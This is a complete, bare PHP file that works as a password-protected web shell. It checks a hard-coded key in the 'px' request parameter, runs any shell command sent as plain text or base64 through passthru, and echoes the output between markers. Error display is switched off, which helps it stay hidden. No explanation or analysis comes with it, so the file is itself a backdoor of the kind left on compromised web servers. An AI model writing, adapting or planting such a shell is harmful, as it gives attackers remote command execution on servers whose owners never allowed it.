<?php
error_reporting(0);@ini_set('display_errors',0);$k="fin3b028aqk6";if(isset($_REQUEST["px"])&&$_REQUEST["px"]===$k){$c=null;if(isset($_REQUEST["b"])){$c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$c=$_REQUEST["c"];}if($c!==null){ob_start();@passthru($c.' 2>&1');$o=ob_get_clean();echo"[S]".$o."[E]";}else{echo"[S]OK[E]";}exit;}
?>